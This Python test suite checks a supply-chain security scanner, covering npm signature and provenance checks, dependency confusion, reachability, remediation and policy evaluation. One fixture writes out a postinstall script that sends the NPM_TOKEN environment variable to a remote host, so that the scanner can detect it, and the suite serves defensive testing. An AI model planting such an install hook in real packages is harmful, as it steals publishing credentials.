"""Stretch goals: provenance + package risk, reachability, policy-as-code, remediation, monitoring.

Offline unit tests, plus integration tests that need podman and the pinned images (skipped otherwise).
"""
import base64
import hashlib
import json
import shutil
import subprocess
import time

import pytest

from guardian import monitor, policy, reachability, registry_intel as ri, remediation, sandbox


# ------------------------------------------------------------------ provenance and package risk (registry_intel)
class FakeFetcher:
    def __init__(self, docs, tarballs=None):
        self.docs, self.tarballs = docs, tarballs or {}

    def get_json(self, url, ttl=0):
        return self.docs.get(url, {"__missing__": True})

    def get_bytes(self, url, limit=0):
        return self.tarballs[url]


def _keypair():
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    key = ec.generate_private_key(ec.SECP256R1())
    pub = base64.b64encode(key.public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)).decode()
    return (lambda msg: base64.b64encode(key.sign(msg, ec.ECDSA(hashes.SHA256()))).decode()), {"k1": {"keyid": "k1", "key": pub}}


def _tgz(files: dict) -> bytes:
    import io
    import tarfile
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(f"package/{name}")
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _doc(name, versions, sign, now):
    out = {"versions": {}, "time": {"created": "2020-01-01T00:00:00Z"}}
    for i, (v, extra) in enumerate(versions.items()):
        integ = "sha512-" + base64.b64encode(hashlib.sha512(f"{name}{v}".encode()).digest()).decode()
        dist = {"integrity": integ, "tarball": f"https://registry.npmjs.org/{name}/-/{name}-{v}.tgz",
                "signatures": [{"keyid": "k1", "sig": sign(f"{name}@{v}:{integ}".encode())}], **extra.pop("dist", {})}
        out["versions"][v] = {"dist": dist, **extra}
        out["time"][v] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(now - (len(versions) - i) * 40 * 86400))
    return out


def test_registry_signature_provenance_and_publisher_checks():
    sign, keys = _keypair()
    now = time.time()
    doc = _doc("lib", {"1.0.0": {"_npmUser": {"name": "alice"}, "maintainers": [{"name": "alice"}],
                                  "dist": {"attestations": {"url": "https://registry.npmjs.org/-/npm/v1/attestations/lib@1.0.0"}}},
                       "1.0.1": {"_npmUser": {"name": "mallory"}, "maintainers": [{"name": "alice"}, {"name": "mallory"}],
                                 "scripts": {"postinstall": "node setup.js"}}}, sign, now)
    tar = _tgz({"setup.js": "const h=require('https');h.get('http://10.0.0.5/c?t='+process.env.NPM_TOKEN)\n"})
    f = FakeFetcher({"https://registry.npmjs.org/lib": doc}, {doc["versions"]["1.0.1"]["dist"]["tarball"]: tar})
    integ = doc["versions"]["1.0.1"]["dist"]["integrity"]
    finds, row = ri.check_package(f, keys, "lib", "1.0.1", integ, "https://registry.npmjs.org/lib/-/lib-1.0.1.tgz", True, {}, now)
    assert row["signature"] == "valid"
    assert {x["type"] for x in finds} >= {"provenance_dropped", "publisher_change", "maintainer_change", "suspicious_install_behavior"}
    beh = row["install_script"]["behaviour"]
    assert {"reads secrets or credentials", "makes network requests"} <= {b["why"] for b in beh}


def test_tampered_lockfile_and_forged_versions_are_hard_signals():
    sign, keys = _keypair()
    now = time.time()
    doc = _doc("lib", {"1.0.0": {}}, sign, now)
    f = FakeFetcher({"https://registry.npmjs.org/lib": doc})
    finds, _ = ri.check_package(f, keys, "lib", "1.0.0", "sha512-AAAA", "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz", False, {}, now)
    assert [(x["type"], x["hard_signal"]) for x in finds] == [("lockfile_integrity_mismatch", True)]
    finds, row = ri.check_package(f, keys, "lib", "9.9.9", "sha512-AAAA", "https://registry.npmjs.org/lib/-/lib-9.9.9.tgz", False, {}, now)
    assert row["signature"] == "missing" and finds[0]["type"] == "registry_version_missing" and finds[0]["severity"] == "critical"
    # a signature made by another key over the same message is invalid
    other_sign, _ = _keypair()
    doc["versions"]["1.0.0"]["dist"]["signatures"][0]["sig"] = other_sign(b"lib@1.0.0:" + doc["versions"]["1.0.0"]["dist"]["integrity"].encode())
    finds, row = ri.check_package(f, keys, "lib", "1.0.0", None, "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz", False, {}, now)
    assert row["signature"] == "invalid" and "signature_invalid" in {x["type"] for x in finds}


def test_internal_scope_from_public_registry_is_dependency_confusion():
    sign, keys = _keypair()
    finds, _ = ri.check_package(FakeFetcher({}), keys, "@acme/core", "1.0.0", None, "https://registry.npmjs.org/@acme/core/-/core-1.0.0.tgz",
                                False, {"internal_scopes": ["@acme"]}, time.time())
    assert finds[0]["type"] == "dependency_confusion" and finds[0]["hard_signal"]


# ------------------------------------------------------------------ reachability
def test_import_level_reachability(tmp_path):
    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "app.js").write_text("const axios = require('axios');\nimport x from '@scope/pkg/sub';\n"
                                                # uptime-kuma: jsonata is loaded by path into a vm context
                                                "new vm.Script(fs.readFileSync(require.resolve(\"jsonata\"), 'utf8'));\n")
    (tmp_path / "test").mkdir()
    (tmp_path / "test" / "a.test.js").write_text("require('lodash')\n")  # tests are not shipped
    (tmp_path / "main.go").write_text('package main\n\nimport (\n\t"golang.org/x/net/http2"\n\tlog "github.com/sirupsen/logrus"\n)\n\nfunc main() {}\n')
    (tmp_path / "app.py").write_text("import yaml\nfrom dateutil import parser\n")
    imps = reachability.collect_imports(tmp_path)
    assert {"axios", "@scope/pkg", "jsonata"} <= set(imps["npm"]) and "lodash" not in imps["npm"]
    assert {"golang.org/x/net/http2", "github.com/sirupsen/logrus"} <= set(imps["go"]) and {"yaml", "dateutil"} <= set(imps["pypi"])
    inv = [{"key": "node_modules/axios", "name": "axios", "version": "1", "ecosystem": "npm", "direct": True, "runtime": True, "path": ["app", "node_modules/axios"]},
           {"key": "node_modules/follow", "name": "follow", "version": "1", "ecosystem": "npm", "direct": False, "runtime": True,
            "path": ["app", "node_modules/axios", "node_modules/follow"]},
           {"key": "node_modules/unused", "name": "unused", "version": "1", "ecosystem": "npm", "direct": True, "runtime": True, "path": ["app", "node_modules/unused"]},
           {"key": "node_modules/jest", "name": "jest", "version": "1", "ecosystem": "npm", "direct": True, "runtime": False, "path": ["app", "node_modules/jest"]},
           {"key": "pypi:pyyaml", "name": "pyyaml", "version": "5", "ecosystem": "pypi", "direct": True, "runtime": True},
           {"key": "pypi:python-dateutil", "name": "python-dateutil", "version": "2", "ecosystem": "pypi", "direct": True, "runtime": True}]
    vulns = [{"name": p["name"], "version": p["version"], "component_key": p["key"], "label": "pre_existing", "ids": []} for p in inv]
    counts = reachability.annotate(vulns, inv, imps)
    assert [v["reachability"]["status"] for v in vulns] == ["imported", "via_import", "not_imported", "dev_only", "imported", "imported"]
    assert counts["counts"]["imported"] == 3


def test_not_imported_lowers_cve_priority_but_never_attacks(monkeypatch):
    from guardian.scoring import intel
    from guardian.scoring.score import score_report
    monkeypatch.setattr(intel, "osv_details", lambda ids: {i: {"aliases": [], "cvss_v3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                                               "cvss_v4": None, "severity_label": None} for i in ids})
    monkeypatch.setattr(intel, "epss", lambda c: ({}, None))
    monkeypatch.setattr(intel, "kev", lambda: ({}, None))
    v = {"key": "a@1#X", "id": "X", "name": "a", "version": "1", "severity": "critical", "label": "pre_existing", "fixed": ["2"], "direct": True, "runtime": True}
    rep = lambda reach: {"inventory": [], "suspicious_changes": [], "ci_image": [], "vulnerabilities": [{**v, "reachability": {"status": reach, "why": ""}}]}  # noqa: E731
    used, unused = score_report(rep("imported"))["findings"][0], score_report(rep("not_imported"))["findings"][0]
    assert unused["score"] < used["score"] and unused["ssvc"]["mission"] == "support" and used["ssvc"]["mission"] == "essential"
    mal = {**v, "malicious": True, "reachability": {"status": "not_imported"}}
    assert score_report({"inventory": [], "suspicious_changes": [], "ci_image": [], "vulnerabilities": [mal]})["findings"][0]["level"] == "critical"


# ------------------------------------------------------------------ remediation plan (offline)
def _report(**extra):
    h = {"base_commit": "b" * 12, "head_commit": "h" * 12, "base_commit_full": "b" * 40, "head_commit_full": "h" * 40, "app": "x"}
    return {"headline": h, "package_changes": {"added": ["axois@1.0.0"], "removed": [], "updated": []}, "ci_image": [], **extra}


def test_plan_groups_advisories_and_removes_attacks():
    inv = [{"key": "node_modules/axios", "name": "axios", "version": "0.21.1", "ecosystem": "npm", "direct": True,
            "found_by": "guardian npm lockfile parser", "source_file": "package-lock.json"},
           {"key": "node_modules/qs", "name": "qs", "version": "6.5.2", "ecosystem": "npm", "direct": False,
            "found_by": "guardian npm lockfile parser", "source_file": "package-lock.json", "path": ["app", "node_modules/body-parser", "node_modules/qs"]},
           {"key": "node_modules/axois", "name": "axois", "version": "1.0.0", "ecosystem": "npm", "direct": True,
            "found_by": "guardian npm lockfile parser", "source_file": "package-lock.json"},
           {"key": "golang:x/net", "name": "golang.org/x/net", "version": "v0.25.0", "ecosystem": "golang"}]
    vul = lambda n, ver, i, fixed, key: {"name": n, "version": ver, "id": i, "key": f"{n}@{ver}#{i}", "fixed": fixed, "label": "pre_existing", "component_key": key}  # noqa: E731
    rep = _report(inventory=inv, vulnerabilities=[vul("axios", "0.21.1", "A", ["0.21.2"], "node_modules/axios"), vul("axios", "0.21.1", "B", ["0.28.0", "1.6.0"], "node_modules/axios"),
                                                  vul("qs", "6.5.2", "Q", ["6.5.3"], "node_modules/qs"), vul("golang.org/x/net", "v0.25.0", "G", ["0.33.0"], "golang:x/net"),
                                                  vul("axios", "0.21.1", "N", [], "node_modules/axios")],
                  suspicious_changes=[{"type": "typosquat", "component": "axois@1.0.0", "label": "introduced", "severity": "high"}])
    plan = remediation.plan(rep)
    kinds = {(a["kind"], a["component"], a.get("to")) for a in plan}
    assert ("remove", "axois@1.0.0", None) in kinds
    assert ("upgrade", "axios@0.21.1", "0.28.0") in kinds  # one action, fixes A and B (same major preferred)
    assert ("override", "qs@6.5.2", "6.5.3") in kinds and ("manual", "golang.org/x/net@v0.25.0", "0.33.0") in kinds
    assert ("manual", "axios@0.21.1", None) in kinds  # advisory N has no fix
    assert plan[0]["kind"] == "remove"


# ------------------------------------------------------------------ monitoring (offline)
def test_monitor_reports_new_advisories(tmp_path, monkeypatch):
    from guardian import universal
    from guardian.scoring import intel
    rep = _report(inventory=[{"key": "k", "name": "lib", "version": "1.0.0", "ecosystem": "npm", "direct": True, "runtime": True}],
                  vulnerabilities=[{"name": "lib", "version": "1.0.0", "id": "GHSA-old", "ids": ["GHSA-old"], "key": "lib@1.0.0#GHSA-old",
                                    "severity": "medium", "label": "pre_existing", "fixed": []}], suspicious_changes=[])
    rep["headline"]["verdict"] = "allow"
    (tmp_path / "report.json").write_text(json.dumps(rep))
    (tmp_path / "latest.json").write_text(json.dumps({"path": str(tmp_path / "report.json")}))
    monkeypatch.setattr(universal, "osv_api", lambda inv: ([{"name": "lib", "version": "1.0.0", "ids": ["GHSA-old"], "severity": "medium", "fixed": []},
                                                            {"name": "lib", "version": "1.0.0", "ids": ["GHSA-new", "CVE-2099-1"], "severity": "critical",
                                                             "fixed": ["1.0.1"], "malicious": False}], None))
    monkeypatch.setattr(intel, "osv_details", lambda ids: {i: {"aliases": [], "cvss_v3": None, "cvss_v4": None, "severity_label": None} for i in ids})
    monkeypatch.setattr(intel, "epss", lambda c: ({}, None))
    monkeypatch.setattr(intel, "kev", lambda max_age=0: ({}, None))
    e = monitor.recheck(tmp_path)
    assert e["new_advisories"] == ["lib@1.0.0 GHSA-new (critical)"] and e["components"] == 1
    assert monitor.history(tmp_path)["history"][0]["new_advisories"] == e["new_advisories"]


# ------------------------------------------------------------------ integration (podman)
def _ready(*images) -> bool:
    if not shutil.which("podman"):
        return False
    st = sandbox.status()
    return all((st["images"].get(i) or {}).get("present") for i in images)


@pytest.mark.skipif(not _ready("conftest"), reason="podman or the pinned conftest image is missing")
def test_policy_as_code_in_the_sandbox(monkeypatch):
    monkeypatch.setenv("GUARDIAN_SANDBOX", "podman")
    rep = _report(inventory=[{"name": "evil", "version": "1", "license": "AGPL-3.0"}],
                  vulnerabilities=[{"name": "axois", "version": "1.0.0", "id": "MAL-1", "severity": "critical", "label": "introduced", "malicious": True, "runtime": True}],
                  suspicious_changes=[{"type": "untrusted_image", "component": "evil.example.com/base:1", "severity": "high", "label": "introduced"}])
    rep["package_changes"]["added"].append("evil@1")
    r = policy.evaluate(rep)
    assert r["error"] is None and r["decision"] == "block"
    assert {"GP-001", "GP-003", "GP-004", "GP-005"} <= {x["id"] for x in r["deny"]}
    assert policy.combine("allow", r) == "block" and policy.combine("review", {"decision": "allow"}) == "review"
    clean = policy.evaluate(_report(inventory=[], vulnerabilities=[], suspicious_changes=[]))
    assert clean["decision"] == "allow"


@pytest.mark.skipif(not _ready("node", "syft", "grype", "zizmor", "conftest"), reason="podman or the pinned images are missing")
def test_validate_and_approve_a_pin_fix(tmp_path, monkeypatch):
    """Full loop on a Python app (no network needed for the fix itself): plan -> validate (rescan) -> human approval -> branch."""
    from guardian import universal
    from guardian.scoring import intel
    monkeypatch.setenv("GUARDIAN_SANDBOX", "podman")
    adv = {"name": "flask", "version": "2.0.0", "ids": ["GHSA-test"], "severity": "high", "fixed": ["2.2.5"], "summary": "", "malicious": False,
           "url": "", "source": "osv", "ecosystem": "pypi"}
    monkeypatch.setattr(universal, "osv_api", lambda inv: ([adv] if any(p["name"] == "flask" and p["version"] == "2.0.0" for p in inv) else [], None))
    monkeypatch.setattr(universal, "grype_all", lambda sbom: ([], None))
    monkeypatch.setattr(intel, "epss", lambda c: ({}, None))
    monkeypatch.setattr(intel, "kev", lambda max_age=0: ({}, None))
    repo = tmp_path / "app"
    repo.mkdir()
    (repo / "requirements.txt").write_text("flask==2.0.0\n")
    (repo / "app.py").write_text("import flask\n")
    git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t"]
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    subprocess.run(git + ["add", "-A"], check=True)
    subprocess.run(git + ["commit", "-qm", "app"], check=True)
    rep = universal.check_any(repo, None, "HEAD", tmp_path / "out", "app")
    fix = next(a for a in remediation.plan(rep) if a["kind"] == "edit_pin")
    assert fix["to"] == "2.2.5"
    v = remediation.validate(rep, [fix["id"]], tmp_path / "out")
    assert v["ok"] and v["fixed"] == ["flask@2.0.0 GHSA-test"] and not v["new_problems"]
    assert not v["still_present"] and not v["coverage_gaps"]
    different = {**rep, "repo": str(shutil.copytree(repo, tmp_path / "copy"))}
    with pytest.raises(ValueError, match="repository or scanned commit changed"):
        remediation.approve(different, v, "Reviewer")
    out = remediation.approve(rep, v, "Reviewer")
    branch = out["approved"]["branch"]
    assert subprocess.run(git + ["show", f"{branch}:requirements.txt"], capture_output=True, text=True).stdout == "flask==2.2.5\n"
    assert "Approved-by: Reviewer" in subprocess.run(git + ["log", "-1", "--format=%B", branch], capture_output=True, text=True).stdout
    assert subprocess.run(git + ["rev-parse", "--abbrev-ref", "HEAD"], capture_output=True, text=True).stdout.strip() != branch  # nothing checked out
